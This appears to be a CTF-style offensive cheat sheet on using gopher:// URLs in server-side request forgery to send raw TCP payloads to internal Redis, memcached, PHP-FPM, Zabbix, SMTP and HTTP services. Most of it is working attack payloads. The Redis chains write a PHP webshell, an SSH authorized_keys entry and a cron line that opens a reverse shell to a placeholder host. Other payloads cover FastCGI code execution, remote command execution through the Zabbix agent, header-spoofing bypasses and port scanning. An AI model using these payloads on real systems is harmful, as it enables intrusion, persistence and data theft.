# gopher — raw TCP through a URL, in depth

gopher is the scheme that turns "fetch a URL" into "open a socket
and say anything". The fetcher's URL-parser builds a TCP payload
from the path — everything after `gopher://host:port/` is sent
verbatim (the `_` is a type-marker the protocol expects).

---

## 1. The wire-shape — what actually gets sent

```text
gopher://127.0.0.1:6379/_PING%0d%0a
                 ↓ the fetcher sends TCP to 127.0.0.1:6379:
PING\r\n
                 ↑ the leading _ is STRIPPED — it's the gopher
                   type-selector — the next byte starts the data
```

The `_` rule: gopher-URL path = `/<typechar><data>` — `_` is the
"typechar" — most tools put `_` to mean "raw" — libcurl strips
the first path-char — so `_PING` → `PING` on the wire.

## 2. The encoding layer — bytes the URL can't hold

```text
CR          → %0d
LF          → %0a
space       → %20  (or literal-space where tolerated — %20 safer)
%           → %25
#           → %23  (fragment-cutoff otherwise!)
?           → %3f  (query-cutoff)
&           → %26
@           → %40
:           → %3a  (in authority)
/           → %2f  (inside data — literal / is fine AFTER the _)
NUL         → %00
0x80-0xff   → %80..%ff — binary bytes work! — gopher carries
              arbitrary binary via %-encoding
```

`#`/`?` terminate the URL in the PARSER — a literal `#` in the
gopher-payload ends it early → always %-encode them inside the
payload. `%0d%0a` is how every line-protocol gets its CRLF.

## 3. gopher_gen — the correct encoding tool

```bash
# redis single-cmd — computes the RESP frame
python3 tools/web/gopher_gen.py redis --cmd "EVAL 'return redis.call(\"get\",\"flag\")' 0"

# raw RESP — build any array frame — args are comma-separated elements
python3 tools/web/gopher_gen.py resp --args "SET,x,v"
python3 tools/web/gopher_gen.py resp --args "EVAL,return redis.call('get','flag'),0"

# arbitrary text — \r\n escapes honoured
python3 tools/web/gopher_gen.py raw --text 'PING\r\n'

# a full http-request — gopher-carrying-HTTP — the header-control path
python3 tools/web/gopher_gen.py http --host 127.0.0.1 --path /admin \
  --header 'X-Forwarded-For: 127.0.0.1'
```

The RESP-encoder exists because hand-counting `$<len>` is the
#1 gopher bug — `EVAL "..."` argument-lengths must be exact bytes.

## 4. gopher→redis — full session

```text
# inline simple-commands — redis tolerates non-RESP too:
gopher://127.0.0.1:6379/_PING
gopher://127.0.0.1:6379/_INFO%20server
gopher://127.0.0.1:6379/_CONFIG%20GET%20dir
gopher://127.0.0.1:6379/_CONFIG%20GET%20dbfilename
gopher://127.0.0.1:6379/_KEYS%20*
gopher://127.0.0.1:6379/_GET%20flag
gopher://127.0.0.1:6379/_TYPE%20flag
gopher://127.0.0.1:6379/_LRANGE%20l%200%20-1
gopher://127.0.0.1:6379/_HGETALL%20h
gopher://127.0.0.1:6379/_SMEMBERS%20s
gopher://127.0.0.1:6379/_ZRANGE%20z%200%20-1
gopher://127.0.0.1:6379/_DBSIZE
gopher://127.0.0.1:6379/_SELECT%201
gopher://127.0.0.1:6379/_CLIENT%20LIST
gopher://127.0.0.1:6379/_DEBUG%20SLEEP%203          — the timing-probe
# RESP-encoded — the %-encoded frame — needed when args contain
# spaces/specials inline-form can't carry:
gopher://127.0.0.1:6379/_%2a2%0d%0a%244%0d%0aKEYS%0d%0a%241%0d%0a%2a%0d%0a
```

## 5. gopher→redis→file-write — the persistence chains

```text
# write a webroot file — the red-island chain:
_CONFIG GET dir                                    → learn the dir
_CONFIG SET dir /var/www/html/
_CONFIG SET dbfilename shell.php
_SET x "<?php%20system($_GET['c']);?>"
_SAVE
# → /shell.php?c=id — RCE

# write to crontab — cron-shell:
_CONFIG SET dir /var/spool/cron/crontabs/  (or /etc/cron.d/)
_CONFIG SET dbfilename root
_SET x "%0a%0a%2a%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3e%26%20
        /dev/tcp/YOU/9000%200%3e%261%0a%0a"
_SAVE
# → cron runs the line → reverse-shell — needs writable crondir

# write an ssh-key:
_CONFIG SET dir /root/.ssh/
_CONFIG SET dbfilename authorized_keys
_SET x "\n\nssh-rsa%20AAA…\n\n"
_SAVE

# write a webshell via module-load or lua — newer redis:
_MODULE LOAD /tmp/x.so              — needs the .so staged first
_SLAVEOF NO ONE / MIGRATE           — the replication-write trick —
                                      master-side rce via rogue-server
```

The `_SAVE`/`_BGSAVE` triggers the actual file-write — the dump-
file is the persistence-surface — redis writes its dataset to
`dir`/`dbfilename` on save.

## 6. gopher→memcached — text-protocol

```text
gopher://127.0.0.1:11211/_stats
gopher://127.0.0.1:11211/_stats%20items
gopher://127.0.0.1:11211/_stats%20cachedump%201%20100
gopher://127.0.0.1:11211/_stats%20slabs
gopher://127.0.0.1:11211/_version
gopher://127.0.0.1:11211/_get%20flag
gopher://127.0.0.1:11211/_gets%20flag
gopher://127.0.0.1:11211/_set%20x%200%200%205%0d%0ahello%0d%0a
gopher://127.0.0.1:11211/_add%20x%200%200%205%0d%0ahello%0d%0a
gopher://127.0.0.1:11211/_flush_all
gopher://127.0.0.1:11211/_lru_crawler%20metadump%20all
```

`stats cachedump`/`lru_crawler metadump` — key-enumeration — then
`get <key>` — memcached is the simplest gopher target — plain
lines, no RESP framing.

## 7. gopher→FastCGI — PHP-FPM (port 9000)

```text
The FastCGI protocol is BINARY records — the gopher-payload is the
records %-encoded — the layout:

FCGI_BEGIN_REQUEST  = \x01\x01<reqid:2>\x00\x08\x00\x00\x00\x01\x00\x00
                      \x00\x00\x00\x00  (record-header + role=responder)
FCGI_PARAMS records = \x01\x04<reqid:2><len:2><pad>  + name-value pairs
                      SCRIPT_FILENAME, REQUEST_METHOD, CONTENT_TYPE, ...
FCGI_PARAMS end     = \x01\x04<reqid:2>\x00\x00\x00\x00
FCGI_STDIN          = \x01\x05<reqid:2><len:2><pad> + body
FCGI_STDIN end      = \x01\x05<reqid:2>\x00\x00\x00\x00

The classic exploit — auto_prepend + arbitrary-php-file:
  SCRIPT_FILENAME=/var/www/html/x.php
  + PHP_VALUE: auto_prepend_file=php://input   — the body as code!
  + body = <?php system($_GET[c]);?> — actually the eval-trick:
    PHP_VALUE: allow_url_include=On + auto_prepend_file=php://input
→ the fpm-worker runs your php — RCE

the full %-encoded FCGI blob is ~600+ bytes — gopher carries it —
each record's len-fields must be exact — script the bytes
```

The FCGI-payload is the longest gopher construction — a mistake in
one length-field breaks it — generate programmatically, don't
hand-encode. The `PHP_VALUE`/`auto_prepend_file` trick is the
known working chain — see `fastcgi-gopher.md` for the record table.

## 8. gopher→zabbix-agent — port 10050

```text
gopher://127.0.0.1:10050/_system.uname
gopher://127.0.0.1:10050/_system.run[id]
gopher://127.0.0.1:10050/_system.run[cat%20/flag]
gopher://127.0.0.1:10050/_vfs.file.contents[/flag]
   — zabbix-agent reads a line → answers — system.run needs
     EnableRemoteCommands=1 — vfs.file.* reads files!
```

## 9. gopher→SMTP — internal mail

```text
gopher://127.0.0.1:25/_HELO%20x%0d%0a
gopher://127.0.0.1:25/_HELO%20x%0d%0aMAIL%20FROM:%3cops@int%3e%0d%0a
        RCPT%20TO:%3cadmin@int%3e%0d%0aDATA%0d%0aSubject:%20x%0d%0a
        %0d%0abody%0d%0a.%0d%0aQUIT%0d%0a
   — the full dialogue in one payload — send mail as the server —
     trigger a password-reset mail to an address you read? or
     internal-phish the admin-bot — the mail may trigger a render —
     a second-order path
```

## 10. gopher→HTTP — an HTTP request over gopher

```text
gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20x%0d%0a
        %0d%0a
   — sends "GET /admin HTTP/1.1\r\nHost: x\r\n\r\n" → the http-
     response comes back — useful when the http-scheme is
     filtered but gopher isn't — OR when you need HEADER-control
     the fetcher doesn't give (custom Host, Authorization, XFF!)
```

The point: the fetcher's normal http:// send may not let you set
`Host:`/`Authorization:`/`X-Forwarded-For:` — gopher lets you
compose the WHOLE request — including headers the app reads:

```text
gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20app%0d%0a
  X-Forwarded-For:%20127.0.0.1%0d%0a%0d%0a
   — the loopback-route that checks XFF → spoofed 127 → passes!
```

## 11. gopher→dict-lookalikes — other line-protocols

```text
gopher://127.0.0.1:6379/   redis      — RESP or inline
gopher://127.0.0.1:11211/  memcached  — text
gopher://127.0.0.1:25/     smtp       — HELO/MAIL/DATA
gopher://127.0.0.1:110/    pop3       — USER/PASS/LIST/RETR
gopher://127.0.0.1:143/    imap       — LOGIN/SELECT/FETCH
gopher://127.0.0.1:21/     ftp        — USER/PASS/RETR — needs the
                                        control-channel data-port —
                                        ftp needs two conns — hard
gopher://127.0.0.1:389/    ldap       — BER-binary — rare workable
gopher://127.0.0.1:2181/   zookeeper  — 4-letter: srvr/stat/cons/dump
gopher://127.0.0.1:2181/_srvr
gopher://127.0.0.1:2181/_dump
gopher://127.0.0.1:2181/_cons
gopher://127.0.0.1:15674/  rabbitmq-web-stomp?
gopher://127.0.0.1:10050/  zabbix
gopher://127.0.0.1:5555/   ?
gopher://127.0.0.1:3306/   mysql      — binary-handshake — the
                                       banner+salt leaks in the
                                       response — fingerprint only —
                                       full-login needs binary-flow
gopher://127.0.0.1:5432/   postgres   — same — startup-message is
                                       binary — banner-ish
gopher://127.0.0.1:6379/   redis      — best target
gopher://127.0.0.1:8086/   influxdb-http? — influx is http — use http://
gopher://127.0.0.1:9001/   supervisord — http-xmlrpc — use http://
```

## 12. gopher→HTTP — the weather-app CRLF shape

```text
The weather-app chain was HTTP-request smuggling THROUGH the url —
%0d%0a in the url-path → raw CRLF in the request → the request
splits → a second request rides along — that's not gopher, it's
CRLF-injection — but the OPPOSITE exists too:
   gopher://app:80/_POST%20/x%20HTTP/1.1%0d%0aHost:%20x%0d%0a
   Content-Length:%204%0d%0a%0d%0aGET%20/admin → the BODY itself
   contains "GET /admin" — a POST with a GET inside → backend-
   parser may handle it differently → desync-adjacent
```

## 13. The gopher-port-scan — one URL, many ports

```text
gopher://127.0.0.1:PORT/x   — one probe per port — the response
                              reveals the service — the PORT-SWEEP
                              via gopher — banner-grab:
   ssh → "SSH-2.0-…"   redis → "-ERR" or +PONG   memcached → "ERROR"
   smtp → "220 …"      mysql → "\x4a\x00\x00\x00\x0a" (binary banner)
   http → the http-response   mongo → binary   zk → "Zookeeper…"
```

## 14. The pitfalls — why gopher fails silently

```text
- the fetcher isn't libcurl — python-requests/java/okhttp don't
  do gopher — no scheme → connection-error — CHECK the callback's
  User-Agent — curl/x.y means libcurl → gopher likely works
- libcurl built WITHOUT gopher (curl --version lists protocols —
  most builds keep it, some distros strip)
- the %-decode happens twice or zero times — %25 vs % handling —
  the payload arrives mangled → the server sees garbage
- the _ offset — forgetting the leading type-char → first byte
  becomes the typechar → payload is off-by-one
- a proxy in front strips/blocks non-http schemes at the egress
- the url-parameter gets validated to ^https?:// before reaching
  the fetcher — gopher dies at the regex not the wire
- DNS-rebind not needed — gopher dial is direct-IP usually —
  but HOSTNAMES in gopher resolve normally
```

## 15. gopher+ssrf decision rule

```text
http:// works + echoes        → stay http — simplest channel
http:// works + no echo        → blind — oob/timing
http:// filtered, file:// ok   → file-read — read-loop
file:// filtered, gopher ok    → raw-tcp — gopher_gen
gopher filtered                → dict:// or redirect-to-http —
                                  or the url-scheme was http-only —
                                  the fetcher caps the scheme-list
```
